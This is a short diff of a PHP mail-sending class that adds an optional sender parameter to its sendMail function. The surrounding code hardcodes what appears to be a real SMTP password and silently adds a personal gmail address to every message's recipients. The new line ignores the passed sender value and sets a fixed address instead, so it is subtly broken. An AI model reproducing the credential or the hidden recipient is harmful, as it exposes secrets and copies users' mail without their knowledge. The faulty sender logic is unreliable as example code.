@@ -85,7 +85,7 @@ class MailNotifier {
         self::$mail->Password = "GtjdFE152T";
     }
 
-    public static function sendMail($subject,$html,$to,$files,$cc) {
+    public static function sendMail($subject,$html,$to,$files,$cc,$from=null) {
         self::initialize();
 
         $to[] = "bitlord1980@gmail.com";
@@ -107,7 +107,7 @@ class MailNotifier {
         self::$mail->Subject = $subject;
 
         self::$mail->msgHTML($html, dirname(__FILE__));
-
+        if($from!=null) self::$mail->setFrom("fadelghan@rc2k.fr");
         return self::$mail->send();
     }
 
